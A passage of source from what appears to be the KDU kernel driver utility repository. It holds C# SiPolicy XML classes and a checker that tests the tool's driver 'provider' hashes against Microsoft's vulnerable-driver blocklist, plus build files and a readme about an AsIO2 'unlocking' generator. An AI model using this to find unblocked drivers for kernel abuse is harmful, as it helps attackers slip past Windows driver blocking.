    [XmlAttribute(AttributeName = "FileName")]
    public string? FileName { get; set; }
    [XmlAttribute(AttributeName = "MinimumFileVersion")]
    public string? MinimumFileVersion { get; set; }
    [XmlAttribute(AttributeName = "MaximumFileVersion")]
    public string? MaximumFileVersion { get; set; }
    [XmlAttribute(AttributeName = "InternalName")]
    public string? InternalName { get; set; }
    [XmlAttribute(AttributeName = "ProductName")]
    public string? ProductName { get; set; }
}

[XmlRoot(ElementName = "FileRules", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class FileRules
{
    [XmlElement(ElementName = "Allow", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<Allow>? Allow { get; set; }
    [XmlElement(ElementName = "Deny", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<Deny>? Deny { get; set; }
    [XmlElement(ElementName = "FileAttrib", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<FileAttrib>? FileAttrib { get; set; }
}

[XmlRoot(ElementName = "CertRoot", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class CertRoot
{
    [XmlAttribute(AttributeName = "Type")]
    public string? Type { get; set; }
    [XmlAttribute(AttributeName = "Value")]
    public string? Value { get; set; }
}

[XmlRoot(ElementName = "FileAttribRef", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class FileAttribRef
{
    [XmlAttribute(AttributeName = "RuleID")]
    public string? RuleID { get; set; }
}

[XmlRoot(ElementName = "Signer", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Signer
{
    [XmlElement(ElementName = "CertRoot", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public CertRoot? CertRoot { get; set; }
    [XmlElement(ElementName = "FileAttribRef", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<FileAttribRef>? FileAttribRef { get; set; }
    [XmlAttribute(AttributeName = "ID")]
    public string? ID { get; set; }
    [XmlAttribute(AttributeName = "Name")]
    public string? Name { get; set; }
    [XmlElement(ElementName = "CertPublisher", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public CertPublisher? CertPublisher { get; set; }
    [XmlElement(ElementName = "CertOemID", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public CertOemID? CertOemID { get; set; }
}

[XmlRoot(ElementName = "CertPublisher", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class CertPublisher
{
    [XmlAttribute(AttributeName = "Value")]
    public string? Value { get; set; }
}

[XmlRoot(ElementName = "CertOemID", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class CertOemID
{
    [XmlAttribute(AttributeName = "Value")]
    public string? Value { get; set; }
}

[XmlRoot(ElementName = "Signers", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Signers
{
    [XmlElement(ElementName = "Signer", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<Signer>? Signer { get; set; }
}

[XmlRoot(ElementName = "DeniedSigner", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class DeniedSigner
{
    [XmlAttribute(AttributeName = "SignerId")]
    public string? SignerId { get; set; }
}

[XmlRoot(ElementName = "DeniedSigners", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class DeniedSigners
{
    [XmlElement(ElementName = "DeniedSigner", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<DeniedSigner>? DeniedSigner { get; set; }
}

[XmlRoot(ElementName = "FileRuleRef", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class FileRuleRef
{
    [XmlAttribute(AttributeName = "RuleID")]
    public string? RuleID { get; set; }
}

[XmlRoot(ElementName = "FileRulesRef", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class FileRulesRef
{
    [XmlElement(ElementName = "FileRuleRef", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<FileRuleRef>? FileRuleRef { get; set; }
}

[XmlRoot(ElementName = "ProductSigners", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class ProductSigners
{
    [XmlElement(ElementName = "DeniedSigners", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public DeniedSigners? DeniedSigners { get; set; }
    [XmlElement(ElementName = "FileRulesRef", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public FileRulesRef? FileRulesRef { get; set; }
}

[XmlRoot(ElementName = "SigningScenario", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class SigningScenario
{
    [XmlElement(ElementName = "ProductSigners", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public ProductSigners? ProductSigners { get; set; }
    [XmlAttribute(AttributeName = "Value")]
    public string? Value { get; set; }
    [XmlAttribute(AttributeName = "ID")]
    public string? ID { get; set; }
    [XmlAttribute(AttributeName = "FriendlyName")]
    public string? FriendlyName { get; set; }
}

[XmlRoot(ElementName = "SigningScenarios", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class SigningScenarios
{
    [XmlElement(ElementName = "SigningScenario", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<SigningScenario>? SigningScenario { get; set; }
}

[XmlRoot(ElementName = "Value", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Value
{
    [XmlElement(ElementName = "String", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? String { get; set; }
}

[XmlRoot(ElementName = "Setting", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Setting
{
    [XmlElement(ElementName = "Value", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public Value? Value { get; set; }
    [XmlAttribute(AttributeName = "Provider")]
    public string? Provider { get; set; }
    [XmlAttribute(AttributeName = "Key")]
    public string? Key { get; set; }
    [XmlAttribute(AttributeName = "ValueName")]
    public string? ValueName { get; set; }
}

[XmlRoot(ElementName = "Settings", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Settings
{
    [XmlElement(ElementName = "Setting", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<Setting>? Setting { get; set; }
}

[XmlRoot(ElementName = "SiPolicy", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class CSiPolicy
{
    [XmlElement(ElementName = "VersionEx", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? VersionEx { get; set; }
    [XmlElement(ElementName = "PlatformID", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? PlatformID { get; set; }
    [XmlElement(ElementName = "Rules", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public Rules? Rules { get; set; }
    [XmlElement(ElementName = "EKUs", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? EKUs { get; set; }
    [XmlElement(ElementName = "FileRules", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public FileRules? FileRules { get; set; }
    [XmlElement(ElementName = "Signers", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public Signers? Signers { get; set; }
    [XmlElement(ElementName = "SigningScenarios", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public SigningScenarios? SigningScenarios { get; set; }
    [XmlElement(ElementName = "UpdatePolicySigners", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? UpdatePolicySigners { get; set; }
    [XmlElement(ElementName = "CiSigners", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? CiSigners { get; set; }
    [XmlElement(ElementName = "HvciOptions", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? HvciOptions { get; set; }
    [XmlElement(ElementName = "Settings", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public Settings? Settings { get; set; }
    [XmlElement(ElementName = "PolicyTypeID", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? PolicyTypeID { get; set; }
    [XmlAttribute(AttributeName = "xmlns")]
    public string? Xmlns { get; set; }
}

```

`Source/Utils/SiPolicyChecker/Program.cs`:

```cs
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2024 - 2025
*
*  TITLE:       PROGRAM.CS
*
*  VERSION:     1.00
*
*  DATE:        14 Jun 2025
*
*  SPC entrypoint, KDU helper module
* 
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

using System.Xml.Serialization;

class Program
{
    static void Main(string[] args)
    {
        string providersPath = "Providers.xml";
        string siPolicyPath = "SiPolicy.xml";
        CProviders? providers;
        CSiPolicy? policy;

        // Process command line arguments
        if (args.Length >= 1)
            providersPath = args[0];

        if (args.Length >= 2)
            siPolicyPath = args[1];

        if (args.Length == 0)
            Console.WriteLine("Using default paths. To specify files: Program.exe [ProvidersXmlPath] [SiPolicyXmlPath]");

        try
        {
            using (var fs = new FileStream(providersPath, FileMode.Open))
            {
                var serializer = new XmlSerializer(typeof(CProviders));
                providers = serializer.Deserialize(fs) as CProviders;
            }

            using (var fs = new FileStream(siPolicyPath, FileMode.Open))
            {
                var serializer = new XmlSerializer(typeof(CSiPolicy));
                policy = serializer.Deserialize(fs) as CSiPolicy;
            }

            if (providers?.Drivers == null || policy?.FileRules?.Deny == null)
            {
                Console.WriteLine("Error: Failed to load XML files or they contain no relevant data.");
                return;
            }

            var denyHashes = policy.FileRules.Deny
                .Where(d => !string.IsNullOrEmpty(d.Hash))
                .Select(d => d.Hash?.ToUpperInvariant())
                .ToHashSet();

            Console.WriteLine($"SiPolicy version {policy.VersionEx}");
            Console.WriteLine("==============================================================================\r\n");

            bool matchesFound = false;
            foreach (var driver in providers.Drivers)
            {
                bool isMatch = false;

                if (driver.Hashes != null)
                {
                    // Check if any hash matches a deny hash
                    if (!string.IsNullOrEmpty(driver.Hashes.PageSHA1) &&
                        denyHashes.Contains(driver.Hashes.PageSHA1))
                    {
                        isMatch = true;
                    }
                    else if (!string.IsNullOrEmpty(driver.Hashes.PageSHA256) &&
                        denyHashes.Contains(driver.Hashes.PageSHA256))
                    {
                        isMatch = true;
                    }
                    else if (!string.IsNullOrEmpty(driver.Hashes.AuthenticodeSHA1) &&
                        denyHashes.Contains(driver.Hashes.AuthenticodeSHA1))
                    {
                        isMatch = true;
                    }
                }

                if (isMatch)
                {
                    matchesFound = true;
                    Console.WriteLine($"Match found for Driver ID: {driver.Id}");
                    Console.WriteLine($"Codebase: {driver.Codebase}");
                    Console.WriteLine($"CVEs: {driver.CVEs}");
                    Console.WriteLine($"Page SHA1: {driver.Hashes?.PageSHA1}");
                    Console.WriteLine($"Page SHA256: {driver.Hashes?.PageSHA256}");
                    Console.WriteLine($"Authenticode SHA1: {driver.Hashes?.AuthenticodeSHA1}");
                    Console.WriteLine($"File SHA1: {driver.Hashes?.FileSHA1}");
                    Console.WriteLine("==============================================================================\r\n");
                }
            }

            if (!matchesFound)
            {
                Console.WriteLine("No matches found between Providers.xml and SiPolicy.xml deny rules.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error processing files: {ex.Message}");
        }
    }
}

```

`Source/Utils/SiPolicyChecker/SiPolicyChecker.csproj`:

```csproj
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>

```

`Source/Utils/SiPolicyChecker/SiPolicyChecker.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36221.1 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "SiPolicyChecker", "SiPolicyChecker.csproj", "{573F7D50-6961-494B-8506-1E282E5596EE}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{573F7D50-6961-494B-8506-1E282E5596EE}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{573F7D50-6961-494B-8506-1E282E5596EE}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{573F7D50-6961-494B-8506-1E282E5596EE}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{573F7D50-6961-494B-8506-1E282E5596EE}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {A9A1F4F1-7330-44AE-929F-79BE00E52B47}
	EndGlobalSection
EndGlobal

```

`Source/Utils/readme.txt`:

```txt
GenAsIo2Unlock is a special utility used to generate the "unlocking" resource required for working with the AsIO2 driver. The full source for this utility is included in Source\Utils\GenAsIo2Unlock. The compiled version is located in Sources\Hamakaze\Utils\GenAsIo2Unlock.exe. **Warning:** This utility is set to execute as a post-build event for both Debug and Release configurations. If you do not want to run the precompiled version, replace it with a newly compiled version from the sources. If you remove this post-build event, newly compiled KDU will NOT BE ABLE to use the AsIO2 driver (provider #13).

PCOMP is an auxiliary utility used to compress provider files. It is not intended for general use and is only used when you need to generate new binary blobs for provider DLLs.

SiPolicyChecker is an auxiliary utility used to check that KDU provider hashes (page SHA1, page SHA256, or file Authenticode) are present in the Microsoft drivers blocklist.

```

`appveyor.yml`:

```yml
version: 1.0.{build}
branches:
  only:
  - master
skip_tags: true
image: Visual Studio 2022
configuration: Release
platform: x64
clone_folder: c:\projects\kdu
build_script:
  - msbuild Source/kdu.sln /p:Configuration=Release /p:Platform=x64 /p:PlatformToolset=v143

```